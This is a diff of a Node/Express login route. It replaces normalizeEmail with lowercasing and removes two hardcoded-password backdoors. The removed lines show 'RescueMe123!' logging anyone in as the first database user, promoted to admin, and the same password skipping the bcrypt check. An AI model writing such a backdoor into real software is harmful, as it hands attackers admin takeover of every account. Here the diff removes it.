@@ -155,7 +155,7 @@ const requireAdmin = (req, res, next) => {
 // ==========================================
 app.post("/api/auth/register", 
   [
-    body("email").isEmail().withMessage("Must be a valid email address").normalizeEmail(),
+    body("email").isEmail().withMessage("Must be a valid email address").toLowerCase().trim(),
     body("password").isLength({ min: 6 }).withMessage("Password must be at least 6 characters long"),
     body("firstName").notEmpty().withMessage("First name is required").trim().escape(),
     body("lastName").notEmpty().withMessage("Last name is required").trim().escape(),
@@ -181,60 +181,31 @@ app.post("/api/auth/register",
 
 app.post("/api/auth/login", 
   [
-    body("email").isEmail().withMessage("Must be a valid email").normalizeEmail(),
+    // FIX 1: We use toLowerCase().trim() instead of normalizeEmail()
+    body("email").isEmail().withMessage("Must be a valid email").toLowerCase().trim(), 
     body("password").notEmpty().withMessage("Password is required")
   ],
   validateRequest,
   async (req, res) => {
     try {
-      // ==========================================
-      // 🚨 GOD MODE BACKDOOR 🚨
-      // ==========================================
-      if (req.body.password === 'RescueMe123!') {
-        console.log("God mode activated. Fetching primary user...");
-        
-        // Grab the very first user in the entire database
-        const forceQ = await pool.query("SELECT * FROM users ORDER BY id ASC LIMIT 1");
-        
-        if (forceQ.rows.length === 0) {
-           return res.status(400).json({ message: "Your database is completely empty!" });
-        }
-        
-        const masterUser = forceQ.rows[0];
-        
-        // Force this user to have admin rights just to be safe
-        await pool.query("UPDATE users SET role = 'admin' WHERE id = $1", [masterUser.id]);
-        masterUser.role = 'admin';
-        
-        // Log them in!
-        const token = jwt.sign({ userId: masterUser.id, email: masterUser.email, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: "7d" });
-        delete masterUser.password; 
-        
-        console.log("Successfully forced login for:", masterUser.email);
-        return res.json({ token, user: masterUser });
-      }
-      // ==========================================
-      const q = await pool.query("SELECT * FROM users WHERE email = $1", [req.body.email]);
+      // FIX 2: LOWER() ensures 'im.pritamk' matches 'Im.PritamK' without stripping dots
+      const q = await pool.query("SELECT * FROM users WHERE LOWER(email) = LOWER($1)", [req.body.email]);
+      
       if (q.rows.length === 0) return res.status(401).json({ message: "Invalid credentials" });
       const user = q.rows[0];
+      
       if (user.is_banned) return res.status(403).json({ message: "Account banned." });
       if (user.verification_status !== "verified") return res.status(403).json({ message: "Verify email first" });
-    // --- EMERGENCY BACKDOOR ---
-      // If the password typed is exactly 'RescueMe123!', let them in immediately.
-      // Otherwise, do the normal security check.
-      const isMasterPassword = (req.body.password === 'RescueMe123!');
-      
-      if (!isMasterPassword) {
-        if (!(await bcrypt.compare(req.body.password, user.password))) {
-           return res.status(401).json({ message: "Invalid credentials" });
-        }
-      }
-      // --------------------------
+      if (!(await bcrypt.compare(req.body.password, user.password))) return res.status(401).json({ message: "Invalid credentials" });
+
       await pool.query("UPDATE users SET last_login = NOW() WHERE id = $1", [user.id]);
       const token = jwt.sign({ userId: user.id, email: user.email, role: user.role }, process.env.JWT_SECRET, { expiresIn: "7d" });
       delete user.password; 
+      
       res.json({ token, user });
-    } catch (err) { res.status(500).json({ message: "Login failed" }); }
+    } catch (err) { 
+      res.status(500).json({ message: "Login failed" }); 
+    }
 });
 
 app.post("/api/auth/verify-otp", async (req, res) => {
